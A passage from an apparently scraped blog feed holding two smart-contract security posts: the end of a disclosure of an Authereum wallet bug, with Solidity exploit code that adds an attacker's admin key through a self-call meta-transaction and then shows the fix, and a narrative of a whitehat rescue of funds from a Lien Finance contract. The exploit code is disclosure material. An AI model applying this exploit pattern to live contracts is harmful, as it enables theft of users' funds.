uint(0),\n        uint(0),\n        address(0),\n        uint(0)\n    ))\n));</code></pre><p>Oopsoopsoopsoopsoopsoopsoops:</p><pre><code class=\"language-solidity\">wallet.executeMultipleAuthKeyMetaTransactions(\n\t[exploitTransaction],\n\t0,\n\t0,\n\taddress(0),\n\t0,\n\t// signed by the hacker\n\thex&quot;274a0272b7dc3e465a7729bfc8b5e57bbf2e2e0a58e223680350564bbea20b7c7a3050f1ba533673dca92342f058ea178b7fecca02efa30a4b9ff082c7b086aa1c&quot;\n);</code></pre><p>The full attack is available in <a href=\"https://gist.github.com/samczsun/bbb53e50900e53b659bb2fe16ce51a1e\">this Gist</a>.</p><h1 id=\"impact\">Impact</h1><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/02/image.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><p>Fortunately, Authereum just launched and there wasn&apos;t much to steal yet.</p><h1 id=\"solution\">Solution</h1><p>The Authereum team relocated the signature check to before the transactions get executed.</p><pre><code class=\"language-solidity\">function executeMultipleAuthKeyMetaTransactions(\n\tbytes[] memory _transactions,\n\tuint256 _gasPrice,\n\tuint256 _gasOverhead,\n\taddress _feeTokenAddress,\n\tuint256 _feeTokenRate,\n\tbytes memory _transactionMessageHashSignature\n)\n\tpublic\n\treturns (bytes[] memory)\n{\n\tuint256 _startGas = gasleft();\n\n\t// Hash the parameters\n\tbytes32 _transactionMessageHash = keccak256(abi.encode(\n\t\taddress(this),\n\t\tmsg.sig,\n\t\tgetChainId(),\n\t\tnonce,\n\t\t_transactions,\n\t\t_gasPrice,\n\t\t_gasOverhead,\n\t\t_feeTokenAddress,\n\t\t_feeTokenRate\n\t)).toEthSignedMessageHash();\n\n\t// Validate the signer\n\t// NOTE: This must be done prior to the _atomicExecuteMultipleMetaTransactions() call for security purposes\n\t_validateAuthKeyMetaTransactionSigs(\n\t\t_transactionMessageHash, _transactionMessageHashSignature\n\t);\n\n\t(, bytes[] memory _returnValues) = _atomicExecuteMultipleMetaTransactions(\n\t\t_transactions,\n\t\t_gasPrice,\n\t\t_gasOverhead,\n\t\t_feeTokenAddress,\n\t\t_feeTokenRate\n\t);\n\n\tif (_shouldRefund(_transactions)) {\n\t  _issueRefund(_startGas, _gasPrice, _gasOverhead, _feeTokenAddress, _feeTokenRate);\n\t}\n\n\treturn _returnValues;\n}</code></pre><h1 id=\"further-reading\">Further Reading</h1><ul><li><a href=\"https://www.theregister.co.uk/2017/07/20/us30_million_below_parity_ethereum_bug_leads_to_big_coin_heist/\">Parity gets hacked</a></li><li><a href=\"https://medium.com/authereum/account-vulnerability-disclosure-ec9e288c6a24\">Authereum&apos;s Disclosure</a></li></ul>","content:encodedSnippet":"tl;dr\nThe Authereum wallet contained a bug which would allow an attacker to take over any wallet at any time. The Authereum team exploited this bug in order to force an upgrade on all user wallets, and as a result no funds were lost.\nAuthereum\nAuthereum is a project which aims to make using Ethereum dApps easier for everyday users. In order to achieve this goal, they've built a set of smart contracts which act as a smart wallet.\nEach smart wallet is owned by a set of admin keys, and the first admin key is generated when a user creates their account on Authereum. Naturally, an admin key can add a new admin key.\nAuthereum wallets also allows relayers to submit transactions so the end user doesn't need to worry about paying for gas. In order to make sure evil relayers can't do bad things, the Authereum wallet verifies that the relayed transaction is signed by an admin key.\nHow to relay a transaction\nLet's take a look at how a relayer might use Authereum meta transactions to relay an ERC20 approval.\nFirst, the user provides the encoded transaction(s). This consists of the target contract, the amount of ether to be sent, the gas limit, and the transaction data. For an ERC20 approval, that might look something like this:\n\nbytes memory encodedTransaction = abi.encode(\n\t0x6B175474E89094C44Da98b954EedeAC495271d0F, // dai\n\t0,\n\tuint(-1),\n\tabi.encodeWithSignature(\n\t\t\"approve(address,uint256)\",\n\t\t0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B, // approve vitalik\n\t\tuint(-1) // for all my dai\n\t)\n);\nDon't spend it all in one place\nNext, the user specifies the minimum gas price that they would like this transaction to be sent at, along with an estimated gas overhead. The user also specifies whether they want to pay in a token other than ETH, and at what rate ETH converts to the token.\nFinally, the user provides a signature, signed with their admin key. Specifically, it's a signature for the following data.\n\nbytes32 hash = keccak256(abi.encodePacked(\n    \"\\x19Ethereum Signed Message:\\n32\",\n    keccak256(abi.encode(\n        address(wallet),\n        wallet.executeMultipleAuthKeyMetaTransactions.selector,\n        wallet.getChainId(),\n        wallet.nonce(),\n        [encodedTransaction],\n        gasPrice,\n        gasOverhead,\n        feeTokenAddress,\n        feeTokenRate\n    ))\n));\nSource\nWhen the relayer has been provided with all of the necessary information, they submit a transaction to executeMultipleAuthKeyMetaTransactions. That function looks something like this:\n\nfunction executeMultipleAuthKeyMetaTransactions(\n\tbytes[] memory _transactions,\n\tuint256 _gasPrice,\n\tuint256 _gasOverhead,\n\taddress _feeTokenAddress,\n\tuint256 _feeTokenRate,\n\tbytes memory _transactionMessageHashSignature\n)\n\tpublic\n\treturns (bytes[] memory)\n{\n\tuint256 _startGas = gasleft();\n\n\t(bytes32 _transactionMessageHash, bytes[] memory _returnValues) = _atomicExecuteMultipleMetaTransactions(\n\t\t_transactions,\n\t\t_gasPrice,\n\t\t_gasOverhead,\n\t\t_feeTokenAddress,\n\t\t_feeTokenRate\n\t);\n\n\t// Validate the signer\n\t_validateAuthKeyMetaTransactionSigs(\n\t\t_transactionMessageHash, _transactionMessageHashSignature\n\t);\n\n\tif (_shouldRefund(_transactions)) {\n\t  _issueRefund(_startGas, _gasPrice, _gasOverhead, _feeTokenAddress, _feeTokenRate);\n\t}\n\n\treturn _returnValues;\n}\nSource\nAt this point, the Authereum wallet will atomically execute all of the transactions, verify that the transactions were signed by an admin key, and then issue a refund if necessary.\nNotice anything wrong?\nMeta all the things\nIf admins could use meta transactions to relay some transactions, it sure would be nice if they could use meta transactions to relay all transactions. However, the only surefire way to make sure that an admin sent a transaction is to check msg.sender, and that doesn't work in a meta transaction.\nActually, if we think about it, the wallet represents the admin. Only the admin can authorize transactions to be sent. That means that if the wallet is the caller, then the admin must have authorized the wallet to call itself, right? So maybe we can treat the wallet as a pseudo-admin of sorts, letting it do some of the scary privileged stuff.\n\nfunction addAuthKey(address _authKey) external onlyAuthKeySenderOrSelf {\n\trequire(authKeys[_authKey] == false, \"BA: Auth key already added\");\n\tauthKeys[_authKey] = true;\n\tnumAuthKeys += 1;\n\temit AuthKeyAdded(_authKey);\n}\nSource\nHopefully there's no way for any random person to make the wallet call a random function on itself that would really suck.\nOops\nOops:\nbytes memory exploitTransaction = abi.encode(\n\twallet,\n\t0,\n\tuint(-1),\n\tabi.encodeWithSignature(\n\t\t\"addAuthKey(address)\",\n\t\t0x32993258F4Bb0f00e3C25cF00a9b490BF86509D8 // the hacker's address\n\t)\n);\nOops oops oops:\nbytes32 hash = keccak256(abi.encodePacked(\n    \"\\x19Ethereum Signed Message:\\n32\",\n    keccak256(abi.encode(\n        address(wallet),\n        wallet.executeMultipleAuthKeyMetaTransactions.selector,\n        wallet.getChainId(),\n        wallet.nonce(),\n        [exploitTransaction],\n        uint(0),\n        uint(0),\n        address(0),\n        uint(0)\n    ))\n));\nOopsoopsoopsoopsoopsoopsoops:\nwallet.executeMultipleAuthKeyMetaTransactions(\n\t[exploitTransaction],\n\t0,\n\t0,\n\taddress(0),\n\t0,\n\t// signed by the hacker\n\thex\"274a0272b7dc3e465a7729bfc8b5e57bbf2e2e0a58e223680350564bbea20b7c7a3050f1ba533673dca92342f058ea178b7fecca02efa30a4b9ff082c7b086aa1c\"\n);\nThe full attack is available in this Gist.\nImpact\n\nFortunately, Authereum just launched and there wasn't much to steal yet.\nSolution\nThe Authereum team relocated the signature check to before the transactions get executed.\nfunction executeMultipleAuthKeyMetaTransactions(\n\tbytes[] memory _transactions,\n\tuint256 _gasPrice,\n\tuint256 _gasOverhead,\n\taddress _feeTokenAddress,\n\tuint256 _feeTokenRate,\n\tbytes memory _transactionMessageHashSignature\n)\n\tpublic\n\treturns (bytes[] memory)\n{\n\tuint256 _startGas = gasleft();\n\n\t// Hash the parameters\n\tbytes32 _transactionMessageHash = keccak256(abi.encode(\n\t\taddress(this),\n\t\tmsg.sig,\n\t\tgetChainId(),\n\t\tnonce,\n\t\t_transactions,\n\t\t_gasPrice,\n\t\t_gasOverhead,\n\t\t_feeTokenAddress,\n\t\t_feeTokenRate\n\t)).toEthSignedMessageHash();\n\n\t// Validate the signer\n\t// NOTE: This must be done prior to the _atomicExecuteMultipleMetaTransactions() call for security purposes\n\t_validateAuthKeyMetaTransactionSigs(\n\t\t_transactionMessageHash, _transactionMessageHashSignature\n\t);\n\n\t(, bytes[] memory _returnValues) = _atomicExecuteMultipleMetaTransactions(\n\t\t_transactions,\n\t\t_gasPrice,\n\t\t_gasOverhead,\n\t\t_feeTokenAddress,\n\t\t_feeTokenRate\n\t);\n\n\tif (_shouldRefund(_transactions)) {\n\t  _issueRefund(_startGas, _gasPrice, _gasOverhead, _feeTokenAddress, _feeTokenRate);\n\t}\n\n\treturn _returnValues;\n}\nFurther Reading\n\nParity gets hacked\nAuthereum's Disclosure","dc:creator":"samczsun","content":"2017 was fun. Let's never do it again.","contentSnippet":"2017 was fun. Let's never do it again.","guid":"5e4b1e97f66f5500017aee56","isoDate":"2020-02-19T03:54:32.000Z","from":"https://samczsun.com/rss/","hashId":"9d01dee83eeaa55b9faf727a264de0de"},{"creator":"samczsun","title":"Escaping the Dark Forest","link":"https://samczsun.com/escaping-the-dark-forest/","pubDate":"Thu, 24 Sep 2020 16:29:39 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2020/09/109768371_xl.jpg\" alt=\"Escaping the Dark Forest\"><p>I was about to wrap up for the night when I decided to take another look at some smart contracts.</p><p>I wasn&#x2019;t expecting anything interesting, of course. Over the past few weeks I had seen countless yield farming clones launch with the exact same pitch: stake your tokens with us and you could be the next cryptocurrency millionaire. Most were simply forks of well-audited code although some tweaked bits and pieces, sometimes with catastrophic results.</p><p>But amidst all of the noise there was some code I hadn&#x2019;t seen before. The contract held over 25,000 Ether, worth over 9,600,000 USD at the time, and would be a very juicy payday for anyone who managed to find a bug in its logic.</p><p>I quickly looked through the code for where Ether is transferred out and found two hits. One of them transferred the Ether to a hardcoded token address, so that could be ignored. The second was a burn function that transferred Ether to the sender. After tracing the usage of this function, I discovered that it would be trivial for anyone to mint tokens to themselves for free, but then burn them in exchange for all of the Ether in the contract. My heart jumped. Suddenly, things had become serious.</p><p>Some digging revealed that the contract I had found was part of <a href=\"https://lien.finance/\">Lien Finance</a>&#x2019;s protocol. Unfortunately, their team was anonymous! The only IM platform they supported was Telegram, and I couldn&#x2019;t be sure that the admins of that channel were actually protocol developers or just a few early supporters. The last thing I wanted to do was accidentally leak the exploit to the wrong person.</p><p>After browsing their website a little while longer, I noticed that they had worked with ConsenSys Diligence and CertiK for an audit. This seemed like a good avenue, since both ConsenSys and CertiK must have interacted with the developers during their audits. I quickly pinged <a href=\"https://twitter.com/maurelian_\">maurelian</a> on Telegram.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2020/09/image.png\" class=\"kg-image\" alt=\"Escaping the Dark Forest\" loading=\"lazy\" width=\"526\" height=\"86\"><figcaption>You never want to be on the receiving end of this message</figcaption></figure><p>Unfortunately, time ticked on, my heart kept pounding, but there was no response from maurelian. It seemed like he had already gone to sleep. Desperate, I sent a message to the ETHSecurity Telegram channel.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2020/09/image-1.png\" class=\"kg-image\" alt=\"Escaping the Dark Forest\" loading=\"lazy\" width=\"519\" height=\"80\"><figcaption>Artist&apos;s rendering of the message, since I deleted the original</figcaption></figure><p>Within minutes, I got a message from someone I&#x2019;d worked with quite a few times in the past - <a href=\"https://twitter.com/wadealexc\">Alex Wade</a>.</p><hr><p>My head had just hit the pillow when I got a knock on my door. It was my roommate: &#x201C;Sam&#x2019;s in the ETHSec Telegram asking for anyone from Diligence.&#x201D;</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2020/09/image-2.png\" class=\"kg-image\" alt=\"Escaping the Dark Forest\" loading=\"lazy\" width=\"486\" height=\"202\"><figcaption>It was, in fact, a long night</figcaption></figure><p>Knowing Sam, this couldn&#x2019;t be good. I found a channel we&#x2019;d set up with Lien a few months ago and an email address. Better than nothing, given their team was anon.</p><p>I was still half asleep. Sam, not wanting to commit details to text, asked for a Zoom call. Groggily wishing I was back in bed, I attempted to gauge the severity of the situation:</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2020/09/image-4.png\" class=\"kg-image\" alt=\"Escaping the Dark Forest\" loading=\"lazy\" width=\"506\" height=\"193\"><figcaption>Five minutes later, it was clear that the situation called for coffee</figcaption></figure><p>Sam and I reviewed the code together. By this point, Sam had already prepared a sample exploit and was able to confirm the issue on his machine. The conversation quickly turned to discussing options:</p><ol><li>Attempt to exploit the issue ourselves.</li><li>Reach out to Lien and have them go public, urging users to withdraw.</li></ol><p>Neither of these were appealing options. The first was risky because, as discussed in <a href=\"https://medium.com/@danrobinson/ethereum-is-a-dark-forest-ecc5f0505dff\">Ethereum is a Dark Forest</a> by <a href=\"https://twitter.com/danrobinson\">Dan Robinson</a> and <a href=\"https://twitter.com/gakonst/\">Georgios Konstantopoulos</a>, the possibility of our transactions getting frontrun was very real. The second option was similarly risky, as a public announcement would draw attention to the problem and create a window of opportunity for attackers. We needed a third option.</p><p>Recalling a section from <em>Ethereum is a Dark Forest</em>, Sam reached out to <a href=\"https://twitter.com/epheph\">Scott Bigelow</a>:</p><blockquote>If you find yourself in a situation like this, we suggest you reach out to Scott Bigelow, a security researcher who has been studying this topic and has a prototype implementation for a better obfuscator.</blockquote><hr><p>After participating in the recovery attempt from <em>Ethereum is a Dark Forest, </em>which ultimately lost to front-runners, I was hungry for a re-match. I&#x2019;ve spent time monitoring front-running and designing a simple system that seemed able to fool generalized front-runners, at least for the $200 I&#x2019;d been able to test it with. When Sam reached out to me in the late evening with the innocent-sounding &#x201C;mind staying up for another hour or so&#x201D;, I couldn&#x2019;t wait to try it out! I was already working it out: how I&#x2019;d make a few tweaks, stay up a couple hours, feel a sense of accomplishment having helped rescue and return a few thousand dollars of user funds, and get a good night&#x2019;s sleep.</p><p>Those plans immediately fell apart when Sam shared the contract with me: ~25,000 ETH, valued at $9.6M, at stake. For as much as I wanted that rematch, $9.6M was way outside my humble script&#x2019;s weight class.</p><p><br>For the past few months, I had been trying to establish contacts with miners for this very purpose: white-hat transaction cooperation. If ever there was a time to appeal to a miner to include a transaction without giving front-runners the chance to steal it, it was now. Luckily, <a href=\"https://twitter.com/tzhen\">Tina</a> and I have worked together over the past few months on establishing this cooperation. It seemed like a slim chance at the time, but it was worth a shot: let&#x2019;s bring Tina into the rescue attempt to work with a mining pool to mine a private transaction.</p><hr><p>I had just evacuated from the Bobcat forest fire and was sipping on unknown beachy drinks zoning out to the monotonic sound of dark Pacific waves, when a Telegram DM from Sam buzzed me back to a darker reality: &#x201C;funds at risk, frontrunnable&#x201D;. Over the last few weeks, I had been collaborating with Sam and Scott on a research project on MEV and could already guess their ask before they sent it: a direct channel to shield a whitehat tx from getting sniped by the &#x201C;advanced predators&#x201D; in the mempool&#x2019;s &#x201C;dark forest&#x201D;.</p><p>Since this was a risky move that entailed exposing our strategy to miners, we decided we should first try to get the greenlight from the anonymous Lien team. While Alex was trying to get in contact via ConsenSys-internal channels, we tried to loop in CertiK as well.</p><p>I realized it may take another 4 hours before Certik&apos;s US-based auditors would wake up, yet the clock was ticking. &#xA0;Knowing nothing much about CertiK beyond the fact it had serviced quite a few Asian projects, I tried to reach the CertiK China team to arbitrage the time zone difference. I blasted a casual sounding message in &#x201C;DeFi the World&#x201D; and &#x201C;Yellow Hats&#x201D; WeChat groups. Four leads slid into my DMs independently within 30 minutes, confirming the WeChat ID that I connected with was indeed the real Zhaozhong Ni, CTO of CertiK. I was added to a WeChat group with 5 CertiK team members, yet at this point I was still not in a position to disclose the project nor the vulnerability. To minimize the exposure and potential liability, we could only invite one member from Certik to join our whitehat operation. After passing a final verification via official email, Georgios Delkos, the engineering lead at CertiK joined our call.</p><p>With Georgios&#x2019;s help, Alex was able to quickly get in contact with the Lien team and verify their identity. We brought them up-to-speed on the current situation and asked for their permission to try working directly with a mining pool to rescue the vulnerable funds. After some deliberation, the Lien team agreed that the risk from trying to rescue the funds directly or publishing a warning was too high, and gave the go-ahead to continue.</p><p>Now we needed to identify a mining pool that had the infrastructure ready in place and would be willing to cooperate with us ASAP. Which mining pool should we tap? Which contact from the pool would be in a position to make technical decisions swiftly that help us beat the clock?</p><p>SparkPool came to mind, as I knew they had been working on a piece of public infrastructure called Taichi Network that could easily offer what we needed. I decided to ping Shaoping Zhang, SparkPool&#x2019;s co-founder, who had helped me investigate mempool events in the past.</p><p>Half an hour later, Shaoping responded: &#x201C;You mean do we have a whitelist service for transactions? Sorry, we don&#x2019;t.&#x201D; Oops, something was lost in translation, &#x201C;whitehat&#x201D; and &#x201C;whitelist&#x201D; sounded similar in Chinese.</p><p>&#x201C;There&#x2019;s 10mn dollar worth of funds at risk. samczsun is on the line.&#x201D; I tried again to communicate the situation without revealing any specifics.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/09/photo5145442418169063579.png\" class=\"kg-image\" alt=\"Escaping the Dark Forest\" loading=\"lazy\" width=\"1920\" height=\"1280\" srcset=\"https://samczsun.com/content/images/size/w600/2020/09/photo5145442418169063579.png 600w, https://samczsun.com/content/images/size/w1000/2020/09/photo5145442418169063579.png 1000w, https://samczsun.com/content/images/size/w1600/2020/09/photo5145442418169063579.png 1600w, https://samczsun.com/content/images/2020/09/photo5145442418169063579.png 1920w\" sizes=\"(min-width: 720px) 720px\"></figure><p>&#x201C;Are you guys saving the world again? Do you need help from our mining pool?&#x201D; To my surprise and great relief, Shaoping jokingly extended an offer to help. After official email verification, Shaoping popped into our marathon Zoom call with the support of a roomful of SparkPool devs.</p><hr><p>After lunch, just when I was about to take a nap, I received a message from Tina: &#x201C;Has SparkPool ever helped with whitehat transactions??&#x201D; I mistook it for whitelisting a transaction at first. No whitehats had approached us before, and we were not familiar with what &#x201C;whitehat transactions&#x201D; entailed. After Tina explained it in more details, I realized that what they needed was a private transaction service, i.e. the whitehats wanted to send transactions to save a DeFi contract, but in order to prevent getting front-runned, they needed a mining pool to include the transaction without broadcasting it.</p><p>We had been working on a &#x201C;private transaction&#x201D; feature on our Taichi Network, which was still under development and had not been tested. I brought the whitehats&#x2019; request to our development team, and explained the urgency: our private transaction feature needed to be in production within a few hours. Our devs said they could try their best to finish in time, and we immediately got to work. We finished development of the private transaction feature in 2 hours, and then spent some time fixing bugs.</p><p>After we completed our internal testing, we sent the <em>whitehat.taichi.network</em> endpoint to Scott Bigelow to deliver the whitehat payload.</p><hr><p>While SparkPool was working to deliver this brand new whitehat API, Sam and I were finishing the script to generate 4 sequential signed transactions. Processing these transactions in order would <em>not</em> withdraw the ~25,000 ETH itself, but would transfer 30,000 SBT+LBT tokens (which were &#x201C;falsely&#x201D; created) to the Lien team, allowing them to submit the final transaction to convert these tokens back into ETH. By transferring the infinitely mintable SBT+LBT tokens to Lien instead of ETH, we used more transactions to obscure how the attack worked from generalized front-runners (in case of a re-org), and <em>I was able to avoid incurring $9.6M of income, even if for a moment</em>.</p><p>Once we had generated 4 signed transactions, Sam and I spent a long time verifying their combinated behavior using a variety of multi-call transaction simulation tools. These 4 transactions, less than 1.5KB of data in total, were ready to heist $9.6M of assets, so long as no-one but SparkPool sees them until it is too late.</p><p>I tested SparkPool&#x2019;s whitehat endpoint with a meaningless transaction, and it worked exactly as expected: the transaction was not seen in the mempool, then suddenly appeared as part of a SparkPool block! It was like watching water vapor turn directly into ice without that <em>pesky</em> liquid phase.</p><p>After adapting the transaction-creation script to feed the transactions directly to SparkPool&#x2019;s new endpoint, it was time. I hesitated for a moment, but this was absolutely our best effort. We might lose $9.6M, but there would be no regrets: I hit &#x201C;run&#x201D; in IntelliJ. I&#x2019;m not sure why, but I expected it to take a while, like node would understand the gravity of the situation and take its time. It did not; the transactions were sent in a matter of milliseconds.</p><p>Everyone on the call began refreshing Etherscan with such vigor, I wondered if the Etherscan team would see a 3-minute spike in traffic. Since only SparkPool had the transactions, and only a portion of SparkPool&#x2019;s hash rate was dedicated to this purpose, there was nothing to do but sweat and wait. Each block that appeared from another miner mocked us. Someone on the call would announce the miner to nervous chuckles. The ~15 blocks it took before our transactions were included felt like hours, but finally, we had our immaculate transactions: mined, in order, not reverted.</p><p>We watched with relief as more and more blocks were built on top of ours and our concerns about block re-orgs quickly faded. The Lien team was now in possession of enough SBT+LBT tokens to liquidate their entire system, and Sam went to coordinate the final phase of the rescue.</p><hr><p>Now that we had successfully transferred the tokens to Lien and there was no sign of any frontrunning, attempted or otherwise, we quickly pinged them with the good news. They confirmed that they received the tokens and immediately sent out a transaction to withdraw the bulk of the ether stored in the contract. Seconds later, a pending transaction appeared on Etherscan.</p><p>As we watched the loading indicator spin, I took the opportunity to reflect upon the events that lead to this moment. What had started as a quick glance at some contracts ended up turning into full-blown warroom that pulled in experts from around the world. Without Alex and Georgios, we wouldn&#x2019;t have been able to make contact with the Lien developer. Without Scott, we would&#x2019;ve been going into a rescue blind. Without Tina, we wouldn&#x2019;t have been able to get in contact with CertiK or SparkPool. Without SparkPool, we would&#x2019;ve been doomed to repeat the history that Dan had written about just weeks ago.</p><p>And yet on a late Tuesday night, our unlikely group united under a common cause and worked tirelessly to try and ensure that over 9.6 million dollars would be returned to their rightful owners. All of our efforts over the last 7 hours led to this single pending transaction and the spinning dots that came with it.</p><p>When the loading indicator finally turned into a green checkmark, the tense silence on the call gave way to a collective sigh of relief.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2020/10/image.png\" class=\"kg-image\" alt=\"Escaping the Dark Forest\" loading=\"lazy\" width=\"832\" height=\"237\" srcset=\"https://samczsun.com/content/images/size/w600/2020/10/image.png 600w, https://samczsun.com/content/images/2020/10/image.png 832w\" sizes=\"(min-width: 720px) 720px\"><figcaption>[1]</figcaption></figure><p>We had escaped the dark forest.</p><hr><p>This post was the culmination of the hard work of many people. Special thanks to Alex Wade, Scott Bigelow, Tina Zhen, Georgios Delkos, and SparkPool for being there when the ecosystem needed you most, as well as Alex Obadia and Dan Robinson for reviewing this post and providing feedback.</p><p>If you&#x2019;re interested in the technical details behind the exploit, <a href=\"https://medium.com/lien-finance/interruption-of-service-incident-analysis-32077389c13\">click here</a> to learn more. If for some reason you still haven&#x2019;t read <a href=\"https://medium.com/@danrobinson/ethereum-is-a-dark-forest-ecc5f0505dff\"><em>Ethereum is a Dark Forest</em></a>, you should definitely do so too.</p><p>[1] <a href=\"https://etherscan.io/tx/0xe99ccb0b21854b65a2fa283638ab9ef01962b61c3310b596b4597bf22b911a43\">The transaction</a></p>","content:encodedSnippet":"I was about to wrap up for the night when I decided to take another look at some smart contracts.\nI wasn’t expecting anything interesting, of course. Over the past few weeks I had seen countless yield farming clones launch with the exact same pitch: stake your tokens with us and you could be the next cryptocurrency millionaire. Most were simply forks of well-audited code although some tweaked bits and pieces, sometimes with catastrophic results.\nBut amidst all of the noise there was some code I hadn’t seen before. The contract held over 25,000 Ether, worth over 9,600,000 USD at the time, and would be a very juicy payday for anyone who managed to find a bug in its logic.\nI quickly looked through the code for where Ether is transferred out and found two hits. One of them transferred the Ether to a hardcoded token address, so that could be ignored. The second was a burn function that transferred Ether to the sender. After tracing the usage of this function, I discovered that it would be trivial for anyone to mint tokens to themselves for free, but then burn them in exchange for all of the Ether in the contract. My heart jumped. Suddenly, things had become serious.\nSome digging revealed that the contract I had found was part of Lien Finance’s protocol. Unfortunately, their team was anonymous! The only IM platform they supported was Telegram, and I couldn’t be sure that the admins of that channel were actually protocol developers or just a few early supporters. The last thing I wanted to do was accidentally leak the exploit to the wrong person.\nAfter browsing their website a little while longer, I noticed that they had worked with ConsenSys Diligence and CertiK for an audit. This seemed like a good avenue, since both ConsenSys and CertiK must have interacted with the developers during their audits. I quickly pinged maurelian on Telegram.\nYou never want to be on the receiving end of this message\nUnfortunately, time ticked on, my heart kept pounding, but there was no response from maurelian. It seemed like he had already gone to sleep. Desperate, I sent a message to the ETHSecurity Telegram channel.\nArtist's rendering of the message, since I deleted the original\nWithin minutes, I got a message from someone I’d worked with quite a few times in the past - Alex Wade.\n\nMy head had just hit the pillow when I got a knock on my door. It was my roommate: “Sam’s in the ETHSec Telegram asking for anyone from Diligence.”\nIt was, in fact, a long night\nKnowing Sam, this couldn’t be good. I found a channel we’d set up with Lien a few months ago and an email address. Better than nothing, given their team was anon.\nI was still half asleep. Sam, not wanting to commit details to text, asked for a Zoom call. Groggily wishing I was back in bed, I attempted to gauge the severity of the situation:\nFive minutes later, it was clear that the situation called for coffee\nSam and I reviewed the code together. By this point, Sam had already prepared a sample exploit and was able to confirm the issue on his machine. The conversation quickly turned to discussing options:\n\nAttempt to exploit the issue ourselves.\nReach out to Lien and have them go public, urging users to withdraw.\n\nNeither of these were appealing options. The first was risky because, as discussed in Ethereum is a Dark Forest by Dan Robinson and Georgios Konstantopoulos, the possibility of our transactions getting frontrun was very real. The second option was similarly risky, as a public announcement would draw attention to the problem and create a window of opportunity for attackers. We needed a third option.\nRecalling a section from Ethereum is a Dark Forest, Sam reached out to Scott Bigelow:\nIf you find yourself in a situation like this, we suggest you reach out to Scott Bigelow, a security researcher who has been studying this topic and has a prototype implementation for a better obfuscator.\n\nAfter participating in the recovery attempt from Ethereum is a Dark Forest, which ultimately lost to front-runners, I was hungry for a re-match. I’ve spent time monitoring front-running and designing a simple system that seemed able to fool generalized front-runners, at least for the $200 I’d been able to test it with. When Sam reached out to me in the late evening with the innocent-sounding “mind staying up for another hour or so”, I couldn’t wait to try it out! I was already working it out: how I’d make a few tweaks, stay up a couple hours, feel a sense of accomplishment having helped rescue and return a few thousand dollars of user funds, and get a good night’s sleep.\nThose plans immediately fell apart when Sam shared the contract with me: ~25,000 ETH, valued at $9.6M, at stake. For as much as I wanted that rematch, $9.6M was way outside my humble script’s weight class.\n\nFor the past few months, I had been trying to establish contacts with miners for this very purpose: white-hat transaction cooperation. If ever there was a time to appeal to a miner to include a transaction without giving front-runners the chance to steal it, it was now. Luckily, Tina and I have worked together over the past few months on establishing this cooperation. It seemed like a slim chance at the time, but it was worth a shot: let’s bring Tina into the rescue attempt to work with a mining pool to mine a private transaction.\n\nI had just evacuated from the Bobcat forest fire and was sipping on unknown beachy drinks zoning out to the monotonic sound of dark Pacific waves, when a Telegram DM from Sam buzzed me back to a darker reality: “funds at risk, frontrunnable”. Over the last few weeks, I had been collaborating with Sam and Scott on a research project on MEV and could already guess their ask before they sent it: a direct channel to shield a whitehat tx from getting sniped by the “advanced predators” in the mempool’s “dark forest”.\nSince this was a risky move that entailed exposing our strategy to miners, we decided we should first try to get the greenlight from the anonymous Lien team. While Alex was trying to get in contact via ConsenSys-internal channels, we tried to loop in CertiK as well.\nI realized it may take another 4 hours before Certik's US-based auditors would wake up, yet the clock was ticking.  Knowing nothing much about CertiK beyond the fact it had serviced quite a few Asian projects, I tried to reach the CertiK China team to arbitrage the time zone difference. I blasted a casual sounding message in “DeFi the World” and “Yellow Hats” WeChat groups. Four leads slid into my DMs independently within 30 minutes, confirming the WeChat ID that I connected with was indeed the real Zhaozhong Ni, CTO of CertiK. I was added to a WeChat group with 5 CertiK team members, yet at this point I was still not in a position to disclose the project nor the vulnerability. To minimize the exposure and potential liability, we could only invite one member from Certik to join our whitehat operation. After passing a final verification via official email, Georgios Delkos, the engineering lead at CertiK joined our call.\nWith Georgios’s help, Alex was able to quickly get in contact with the Lien team and verify their identity. We brought them up-to-speed on the current situation and asked for their permission to try working directly with a mining pool to rescue the vulnerable funds. After some deliberation, the Lien team agreed that the risk from trying to rescue the funds directly or publishing a warning was too high, and gave the go-ahead to continue.\nNow we needed to identify a mining pool that had the infrastructure ready in place and would be willing to cooperate with us ASAP. Which mining pool should we tap? Which contact from the pool would be in a position to make technical decisions swiftly that help us beat the clock?\nSparkPool came to mind, as I knew they had been working on a piece of public infrastructure called Taichi Network that could easily offer what we needed. I decided to ping Shaoping Zhang, SparkPool’s co-founder, who had helped me investigate mempool events in the past.\nHalf an hour later, Shaoping responded: “You mean do we have a whitelist service for transactions? Sorry, we don’t.” Oops, something was lost in translation, “whitehat” and “whitelist” sounded similar in Chinese.\n“There’s 10mn dollar worth of funds at risk. samczsun is on the line.” I tried again to communicate the situation without revealing any specifics.\n\n“Are you guys saving the world again? Do you need help from our mining pool?” To my surprise and great relief, Shaoping jokingly extended an offer to help. After official email verification, Shaoping popped into our marathon Zoom call with the support of a roomful of SparkPool devs.\n\nAfter lunch, just when I was about to take a nap, I received a message from Tina: “Has SparkPool ever helped with whitehat transactions??” I mistook it for whitelisting a transaction at first. No whitehats had approached us before, and we were not familiar with what “whitehat transactions” entailed. After Tina explained it in more details, I realized that what they needed was a private transaction service, i.e. the whitehats wanted to send transactions to save a DeFi contract, but in order to prevent getting front-runned, they needed a mining pool to include the transaction without broadcasting it.\nWe had been working on a “private transaction” feature on our Taichi Network, which was still under development and had not been tested. I brought the whitehats’ request to our development team, and explained the urgency: our private transaction feature needed to be in production within a few hours. Our devs said they could try their best to finish in time, and we immediately got to work. We finished development of the private transaction feature in 2 hours, and then spent some time fixing bugs.\nAfter we completed our internal testing, we sent the whitehat.taichi.network endpoint to Scott Bigelow to deliver the whitehat payload.\n\nWhile SparkPool was working to deliver this brand new whitehat API, Sam and I were finishing the script to generate 4 sequential signed transactions. 